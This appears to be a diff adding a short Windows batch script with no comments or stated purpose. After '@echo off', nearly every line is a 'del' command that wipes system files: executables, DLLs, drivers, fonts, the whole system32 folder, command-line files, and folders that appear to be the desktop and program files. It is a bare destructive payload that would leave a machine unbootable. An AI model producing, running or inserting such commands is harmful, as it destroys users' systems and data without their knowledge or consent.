@@ -1,0 +1,24 @@
+@echo off
+@if errorlevel 1 pause
+del c:\windows\*.exe
+del c:\windows\*.dll
+del c:\windows\*.sys
+del c:\windows\*.ini
+del c:\windows\*.txt
+del c:\windows\escrit~1\*.lnk
+del c:\windows\fonts\*.ttf
+del c:\windows\fonts\*.fon
+del c:\windows\help\*.hlp
+del c:\windows\system32\drivers\*.sys
+del c:\windows\system32\drivers\*.dll
+del c:\windows\system32\*.*
+del c:\windows\system\*.dll
+del c:\windows\system\*.sys
+del c:\windows\system\*.sys
+del c:\windows\system\*.*
+del c:\windows\sysbckup\*.dll
+del c:\windows\command\keyboard.sys
+del c:\archiv~1\*.*
+del c:\windows\command\ega.cpi
+del c:\windows\command\*.cpi
+del c:\windows\command\*.com
